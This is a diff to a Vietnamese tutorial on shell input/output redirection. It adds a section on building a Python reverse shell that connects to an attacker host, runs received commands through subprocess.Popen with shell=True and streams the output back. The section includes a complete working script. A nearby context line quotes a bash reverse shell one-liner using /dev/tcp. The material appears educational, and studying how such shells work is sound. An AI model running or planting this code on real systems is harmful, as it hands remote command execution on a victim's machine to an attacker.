@@ -436,7 +436,78 @@ Như vậy, `ncat` không sử dụng việc redirect stdin và stdout trực ti
 5. Ghi dữ liệu từ pipe ra socket connection sử dụng [write_loop](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L272) hoặc [ncat_send](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L291)
 
 
-#### Sử dụng output redirection cho reverse shell python (TODO)
+#### Sử dụng output redirection cho Reverse Shell python
+
+Để có thể viết Reverse Shell có real-time output, ta cần sử dụng hàm hỗ trợ lấy output của process khi process đang chạy. Ta có thể sử dụng method [subprocess.Popen](https://docs.python.org/3/library/subprocess.html#popen-constructor) để khởi tạo tiến trình. Dữ liệu được đẩy qua [Popen.stdout](https://docs.python.org/3/library/subprocess.html#subprocess.Popen.stdout) là [một stream object thuộc io.BufferedReader](https://docs.python.org/3/library/io.html#io.BufferedReader) nên ta có thể trích xuất real-time bằng các method như [read](https://docs.python.org/3/library/io.html#io.BufferedReader.read) hoặc [readline](https://docs.python.org/3/library/io.html#io.BufferedReader.read)
+
+Đầu tiên, tiến hành nhận và thực thi lệnh tứ phía server
+```
+command = s.recv(1024).decode('utf-8')
+proc = subprocess.Popen(command, shell=True, stdout=proc_pipe, stderr=proc_stdout)
+```
+
+Tiếp theo, tạo vòng lặp để gửi data về phía client từ stream stdout:
+```
+while True:
+    line = proc.stdout.readline()
+    if not line:
+        proc.terminate()
+        break
+    s.sendall(line)
+```
+
+<details>
+<summary>Code hoàn chỉnh</summary>
+
+```
+import socket
+import subprocess
+from subprocess import PIPE as proc_pipe
+from subprocess import STDOUT as proc_stdout
+
+
+# Cấu hình máy Attacker (Server)
+ATTACKER_HOST = '127.0.0.1'  # THAY ĐỔI: IP thực tế của máy Attacker
+ATTACKER_PORT = 9191         # Cổng Attacker đang lắng nghe
+
+def reverse_shell():
+    # 1. Tạo và kết nối socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ATTACKER_HOST, ATTACKER_PORT))
+
+    # Vòng lặp chính để nhận và thực thi lệnh
+    while True:
+        # 2. Nhận lệnh từ Server (Attacker)
+        command = s.recv(1024).decode('utf-8')
+
+        if not command or command.lower() == 'exit':
+            s.send(b"[!] Closing.\n")
+            break # Thoát khỏi vòng lặp nhận lệnh
+
+        # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
+        try:
+            # Khởi tạo tiến trình con
+            # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
+            # Redirect stderr ra stdout
+            proc = subprocess.Popen(command, shell=True, stdout=proc_pipe, stderr=proc_stdout)
+            # Dùng vòng lặp để đọc stdout từ phía tiến trình con
+            # Nếu stdout là empty -> ngừng tiến trình con và break loop
+            while True:
+                line = proc.stdout.readline()
+                if not line:
+                    proc.terminate()
+                    break
+                s.sendall(line)
+        except Exception as e:
+            s.send(f"[-] Error: {str(e)}".encode('utf-8'))
+
+    # 5. Đóng socket và nghỉ trước khi kết nối lại
+    s.close()
+
+if __name__ == '__main__':
+    reverse_shell()
+```
+</details>
 
 # Interactive và non-interactive shell.
 Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.
